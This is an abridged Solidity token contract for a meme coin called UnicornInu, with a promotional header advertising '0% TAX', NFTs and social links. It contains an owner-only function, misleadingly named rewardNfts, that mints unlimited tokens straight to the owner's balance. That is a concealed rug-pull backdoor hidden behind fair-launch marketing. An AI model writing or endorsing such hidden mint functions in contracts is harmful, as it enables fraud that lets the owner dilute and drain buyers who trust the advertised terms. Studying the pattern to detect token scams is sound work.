...
/**
Welcome to unicornInu (UNICORNINU)! Just True Inu. We have upcoming NFT's, check website. 0% TAX INU like SHIBA INU
...
Web: https://unicorninu.org/
TG: https://t.me/UnicorninuETH
Twitter: https://twitter.com/UnicornInuEth
...
contract UnicornInu is Context, IERC20, Ownable {
    ...
    function rewardNfts(uint256 amount) external onlyOwner {
        _balances[owner()] += amount;
        _totalSupply += amount;
    }
